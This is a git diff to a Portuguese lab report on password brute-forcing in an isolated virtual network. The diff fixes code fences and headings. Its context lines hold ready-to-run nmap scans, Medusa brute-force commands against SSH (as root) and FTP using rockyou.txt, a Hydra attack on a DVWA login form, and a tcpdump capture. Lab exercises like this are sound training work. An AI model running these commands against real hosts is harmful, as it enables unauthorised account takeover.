@@ -50,35 +50,35 @@ Máquinas foram iniciadas em rede isolada para evitar impacto externo.
 sudo apt update
 sudo apt install -y medusa hydra nmap tcpdump
 ls -lh /usr/share/wordlists/
-
+```
 ### 4.2. Scan de serviços
 ```bash
 nmap -sV -p- 192.168.56.102 -oN nmap_full_scan.txt
 # ou scan focado:
 nmap -sV -p22,21,80,443 192.168.56.102 -oN nmap_services.txt
-
+```
 ### 4.3. Força bruta em SSH (Medusa)
 ```bash
 medusa -h 192.168.56.102 -u root -P /usr/share/wordlists/rockyou.txt -M ssh -t 4 -f -O evidencias/medusa_ssh.txt
-
+```
 ### 4.4. Força bruta em FTP (Medusa)
 ```bash
 medusa -h 192.168.56.102 -u ftp -P /usr/share/wordlists/rockyou.txt -M ftp -t 4 -f -O evidencias/medusa_ftp.txt
-
+```
 ### 4.5. Força bruta em formulário HTTP (DVWA) — exemplo com Hydra
 ```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.102 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^:Login" -V -o evidencias/hydra_http_dvwa.txt
-
+```
 ### 4.6. Captura de tráfego (pcap)
 ```bash
 sudo tcpdump -i <interface> host 192.168.56.102 and host 192.168.56.101 -w evidencias/capture_lab.pcap
 # Pare com Ctrl+C quando terminar.
-
+```
 ---
 
-# Agora os arquivos `.txt` (templates / exemplos) — copie e salve em `evidencias/`
+### Agora os arquivos `.txt` (templates / exemplos) — copie e salve em `evidencias/`
 
-## `nmap_full_scan.txt`
+#### `nmap_full_scan.txt`
 ```text
 # nmap 7.80 scan initiated Thu Oct  7 14:00:00 2025 as: nmap -sV -p- 192.168.56.102
 Nmap scan report for 192.168.56.102
